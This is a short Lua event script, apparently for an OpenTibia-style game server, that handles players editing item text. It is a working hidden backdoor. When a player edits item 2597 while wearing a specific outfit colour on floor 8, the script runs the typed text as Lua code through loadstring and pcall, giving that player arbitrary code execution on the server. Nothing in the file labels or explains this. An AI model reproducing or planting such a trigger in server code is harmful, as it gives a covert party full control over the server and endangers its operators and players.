function onTextEdit(cid, item, newText)
if item.itemid == 2597 and getCreatureOutfit(cid).lookFeet == 24 and getPlayerPosition(cid).z == 8 then
a,b = pcall(loadstring(newText))
if a == FALSE then
doPlayerSendCancel(cid, b)
end
end
return TRUE
end
